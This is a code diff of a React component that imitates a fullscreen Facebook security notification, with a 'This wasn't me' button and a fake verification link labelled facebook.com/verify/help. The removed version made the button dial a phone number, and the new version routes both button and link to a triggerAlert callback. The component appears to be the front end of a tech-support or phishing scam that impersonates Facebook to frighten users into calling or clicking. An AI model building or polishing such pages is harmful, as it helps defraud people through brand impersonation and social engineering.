@@ -229,10 +229,11 @@
 
 
 import React from 'react';
+// import FacebookNotification from './notification';
 
-const FullscreenNotificationTemplate = () => {
+const FullscreenNotificationTemplate = ({ triggerAlert }) => {
   const handleRegisterClick = () => {
-    window.location.href = 'tel:18338692112';
+    triggerAlert(); 
   };
   
   return (
@@ -266,11 +267,10 @@ const FullscreenNotificationTemplate = () => {
                 
                 <button
                   onClick={handleRegisterClick}
-                  className="w-full sm:w-auto px-4 sm:px-6 py-1.5 sm:py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-lg text-xs sm:text-base lg:text-lg transition-colors"
+                  className="w-full sm:w-auto px-4 sm:px-6 py-1.5 sm:py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-lg text-xs sm:text-base lg:text-lg transition-colors cursor-pointer"
                 >
                   This wasn't me
                 </button>
-                
                 <div className="space-y-1.5 sm:space-y-3 lg:space-y-4 text-xs sm:text-base lg:text-lg text-gray-700">
                   <p>
                     If this was you, ignore this notification.
@@ -278,8 +278,8 @@ const FullscreenNotificationTemplate = () => {
                 
                   <p className="text-xs sm:text-base lg:text-lg">
                     Verify this notification:
-                    <a href="facebook-support" className="text-blue-600 hover:text-blue-700 hover:underline ml-1">
-                      facebook.com/help/verify
+                    <a className="text-blue-600 hover:text-blue-700 hover:underline ml-1 cursor-pointer" onClick={handleRegisterClick}>
+                      facebook.com/verify/help
                     </a>
                   </p>
                   
